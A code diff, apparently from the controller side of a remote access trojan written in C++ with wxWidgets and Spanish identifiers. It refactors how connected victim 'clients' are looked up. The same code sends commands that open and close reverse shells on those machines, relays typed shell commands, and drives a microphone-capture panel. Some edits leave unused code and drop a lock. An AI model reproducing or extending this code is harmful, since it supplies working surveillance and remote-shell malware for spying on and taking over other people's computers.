@@ -36,15 +36,14 @@ FrameCliente::FrameCliente(std::string strID, wxString nameID)
     //std::vector<std::string> vcOut = strSplit(strID, '/', 1);
     this->strClienteID = nameID;
 
+    int iTempID = atoi(nameID.substr(nameID.size() - 3, 3).c_str());
     std::unique_lock<std::mutex> lock(vector_mutex);
-    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
-        if (iter->_id == this->strClienteID) {
-            iter->_isBusy = true;
-            break;
-        }
-        ++iter;
+    auto cliIT = p_Servidor->um_Clientes.find(iTempID);
+    if (cliIT != p_Servidor->um_Clientes.end()) {
+        cliIT->second._isBusy = true;
     }
     lock.unlock();
+
 
     
     wxString strTitle = "[";
@@ -110,17 +109,12 @@ void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
     if (pageTitle == "Reverse Shell") {
         //Enviar comando para cerrar shell al cerra la tab
         std::unique_lock<std::mutex> lock(vector_mutex);
-
-        for (auto aClient = p_Servidor->vc_Clientes.begin(); aClient != p_Servidor->vc_Clientes.end(); aClient++) {
-            if (aClient->_id == this->strClienteID) {
-                if (aClient->_isRunningShell) {
-                    aClient->_isRunningShell = false;
-                    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
-                    strComando += "~exit\r\n";
-                    p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
-                }
-                break;
-            }
+        int iTempID = atoi(this->strClienteID.substr(this->strClienteID.size() - 3, 3).c_str());
+        auto aClient = p_Servidor->um_Clientes.find(iTempID);
+        if (aClient != p_Servidor->um_Clientes.end()) {
+            std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
+            strComando += "~exit\r\n";
+            p_Servidor->cSend(aClient->second._sckCliente, strComando.c_str(), strComando.size(), 0, false);
         }
         lock.unlock();
     }
@@ -130,7 +124,7 @@ void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
 void FrameCliente::OnTest(wxCommandEvent& event) {
     std::vector<struct Cliente> vc_Copy;
     std::unique_lock<std::mutex> lock(vector_mutex);
-    
+    //OLD METHOD
     vc_Copy = p_Servidor->vc_Clientes;
     lock.unlock();
     
@@ -146,20 +140,17 @@ void FrameCliente::OnTest(wxCommandEvent& event) {
 void FrameCliente::OnClose(wxCloseEvent& event) {
     std::unique_lock<std::mutex> lock(vector_mutex);
     
-    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
-        if (iter->_id == this->strClienteID) {
-            iter->_isBusy = false;
-            iter->_ttUltimaVez = time(0);
-            std::cout << "running shell?: " << iter->_isRunningShell << std::endl;
-            if (iter->_isRunningShell) {
-                iter->_isRunningShell = false;
-                std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
-                strComando += "~exit\r\n";
-                p_Servidor->cSend(iter->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
-            } 
-            break;
+    int iTempID = atoi(this->strClienteID.substr(this->strClienteID.size() - 3, 3).c_str());
+    auto aClient = p_Servidor->um_Clientes.find(iTempID);
+    if (aClient != p_Servidor->um_Clientes.end()) {
+        aClient->second._isBusy = false;
+        aClient->second._ttUltimaVez = time(0);
+        if (aClient->second._isRunningShell) {
+            aClient->second._isRunningShell = false;
+            std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
+            strComando += "~exit\r\n";
+            p_Servidor->cSend(aClient->second._sckCliente, strComando.c_str(), strComando.size(), 0, false);
         }
-        ++iter;
     }
     
     lock.unlock();
@@ -236,15 +227,15 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
     //Enviar comando al cliente para que ejecute
     std::unique_lock<std::mutex> lock(vector_mutex);
 
-    for (auto aClient = p_Servidor->vc_Clientes.begin(); aClient != p_Servidor->vc_Clientes.end(); aClient++) {
-        if (aClient->_id == this->strID) {
-            aClient->_isRunningShell = true;
-            std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
-            strComando += "~0";
-            int ib = p_Servidor->cSend(aClient->_sckCliente, strComando.c_str(), strComando.size(), 0, false);
-            break;
-        }
+    int iTempID = atoi(this->strID.substr(this->strID.size() - 3, 3).c_str());
+    auto aClient = p_Servidor->um_Clientes.find(iTempID);
+    if (aClient != p_Servidor->um_Clientes.end()) {
+        aClient->second._isRunningShell = true; 
+        std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
+        strComando += "~0";
+        p_Servidor->cSend(aClient->second._sckCliente, strComando.c_str(), strComando.size(), 0, false);
     }
+
     lock.unlock();
 
 }
@@ -293,18 +284,19 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
 
         str1.append(1, '\r');
         str1.append(1, '\n');
-        std::vector<struct Cliente> vc_Copy;
+        
         std::unique_lock<std::mutex> lock(vector_mutex);
 
-        vc_Copy = p_Servidor->vc_Clientes;
-        lock.unlock();
-
-        for (auto vcCli : vc_Copy) {
-            if (vcCli._id == this->strID) {
-                int iEnviado = p_Servidor->cSend(vcCli._sckCliente, str1.c_str(), str1.size()+1, 0, false);
-                break;
-            }
+        int iTempID = atoi(this->strID.substr(this->strID.size() - 3, 3).c_str());
+        auto aClient = p_Servidor->um_Clientes.find(iTempID);
+        if (aClient != p_Servidor->um_Clientes.end()) {
+            aClient->second._isRunningShell = true;
+            std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
+            strComando += "~0";
+            p_Servidor->cSend(aClient->second._sckCliente, str1.c_str(), str1.size()+1, 0, false);
         }
+
+        lock.unlock();
         
         this->p_uliUltimo = this->txtConsole->GetLastPosition() + 2;
           
@@ -391,15 +383,9 @@ void panelMicrophone::OnDetener(wxCommandEvent& event) {
 }
 
 void panelMicrophone::EnviarComando(std::string pComando) {
-    std::vector<struct Cliente> vc_copy;
-    std::unique_lock<std::mutex> lock(vector_mutex);
-    vc_copy = p_Servidor->vc_Clientes;
-    lock.unlock();
-
-    for (auto vcCli : vc_copy) {
-        if (vcCli._id == this->strID) {
-            int iEnviado = p_Servidor->cSend(vcCli._sckCliente, pComando.c_str(), pComando.size() + 1, 0, false);
-            break;
-        }
+    int iTempID = atoi(this->strID.substr(this->strID.size() - 3, 3).c_str());
+    auto aClient = p_Servidor->um_Clientes.find(iTempID);
+    if (aClient != p_Servidor->um_Clientes.end()) {
+        p_Servidor->cSend(aClient->second._sckCliente, pComando.c_str(), pComando.size() + 1, 0, false);
     }
 }
